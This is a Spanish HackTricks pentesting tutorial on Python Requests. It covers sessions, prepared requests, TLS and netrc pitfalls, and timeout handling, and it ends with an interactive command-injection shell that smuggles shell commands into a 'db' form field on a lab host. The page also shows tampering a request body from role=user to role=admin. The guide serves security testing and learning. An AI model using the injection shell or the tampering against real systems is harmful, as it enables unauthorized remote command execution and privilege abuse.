# Solicitudes web

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Estos ejemplos utilizan los argumentos de solicitud documentados de Requests, las propiedades de respuesta, las tuplas de archivos multipart y las sesiones.<sup>[[1]](#references)</sup> Los ejemplos con `verify=False` deshabilitan la verificación de certificados TLS y deben limitarse a pruebas controladas.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Solicitudes preparadas para el control de payloads

Un `PreparedRequest` expone la URL final, los encabezados y el cuerpo codificado antes de enviarlo. Constrúyelo con `Session.prepare_request()` (en lugar de `Request.prepare()`) cuando deban aplicarse las cookies o la autenticación de la sesión; cuando el flujo preparado también deba respetar la configuración de proxy/CA del entorno, combínala explícitamente con `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Esto resulta útil cuando un exploit necesita una codificación no estándar o cuando se compara el payload construido con la solicitud almacenada en `response.request`. No es una primitiva de raw-HTTP: Requests almacena los headers en un mapeo que no distingue mayúsculas de minúsculas, por lo que asignar un nombre duplicado reemplaza el valor anterior. Usa un sender de nivel inferior para líneas de solicitud malformadas o campos `Content-Length`/`Transfer-Encoding` duplicados y distintos, necesarios para [pruebas de HTTP request-smuggling](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Aislamiento de sesiones, credenciales implícitas y estado de TLS

Una sesión confía en la configuración del entorno de forma predeterminada. Si no se proporciona autenticación explícita, Requests puede obtener credenciales Basic de `.netrc`; también puede importar la configuración del proxy y las rutas de los CA bundle desde variables de entorno. Para scripts que obtienen URLs controladas por un atacante, desactiva esas entradas implícitas y configura explícitamente solo el proxy/CA previsto del laboratorio. Las versiones anteriores a la 2.32.4 podían seleccionar credenciales de `.netrc` para el host equivocado al recibir una URL creada de forma maliciosa, mientras que `Session.trust_env = False` es la solución documentada cuando no es posible actualizar.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Mantén una sesión que utilice `verify=False` separada de las sesiones que requieran TLS verificado. En Requests anteriores a la versión 2.32.0, una conexión abierta inicialmente con `verify=False` podía reutilizarse para solicitudes posteriores al mismo origen, incluso cuando esas solicitudes especificaban `verify=True`; actualizar corrige ese problema del estado del pool, pero el aislamiento también facilita auditar los scripts de exploit.<sup>[[5]](#references)</sup>

## Bucles de exploit fiables

Requests no tiene un timeout predeterminado. Un timeout `(connect, read)` no es un límite total de tiempo de pared: el componente de lectura limita cuánto tiempo espera el cliente entre bytes recibidos. Desactiva las redirecciones automáticas cuando el objetivo controla `Location`, y luego valida cada salto antes de enviar una nueva solicitud; si las redirecciones están habilitadas, inspecciona `response.history`. Para respuestas grandes u hostiles, utiliza `stream=True`, itera en chunks acotados y cierra la respuesta con un context manager para que la conexión del pool se libere.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Comando de Python para explotar un RCE

El bucle de comandos hereda de `Cmd` de Python; su método `default` gestiona los prefijos de comandos no reconocidos, `cmdloop` distribuye las líneas de entrada y `re.DOTALL` permite que el patrón de extracción abarque saltos de línea.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Interfaz de desarrollo de Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Compatibilidad con intérpretes de comandos orientados a líneas](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Operaciones con expresiones regulares](https://docs.python.org/3/library/re.html)
- [4] [Requests vulnerable a un leak de credenciales de `.netrc` mediante URLs maliciosas](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [El objeto `Session` de Requests no verifica las requests después de realizar la primera request con `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
